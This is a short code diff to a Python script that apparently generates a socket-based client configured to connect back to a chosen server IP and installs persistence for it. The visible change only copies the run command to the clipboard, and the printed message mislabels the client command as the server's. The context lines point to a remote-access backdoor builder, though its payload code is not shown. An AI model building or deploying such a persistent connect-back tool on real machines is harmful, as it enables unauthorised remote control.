@@ -4,6 +4,7 @@ import subprocess
 import shutil
 import platform
 import re
+import pyperclip
 
 # Template for the client code. Note the placeholder {SERVER_IP_PLACEHOLDER}.
 CLIENT_CODE_TEMPLATE = """import socket
@@ -178,7 +179,12 @@ def main():
     install_persistence(script_path)
     
     print(f"\n[!] The client is configured to connect to: {server_ip}")
-    print(f"[!] To run manually for testing: {python_cmd} {script_path}")
+
+    run_command = f"{python_cmd} {script_path}"
+    print(f"\n[!] To run the server: {run_command}")
+    pyperclip.copy(run_command)
+    print("Run command copied to clipboard")
+    
     print("\n[!] Reminder: Ensure the server is running and listening on that IP before starting the client.")
 
 if __name__ == "__main__":
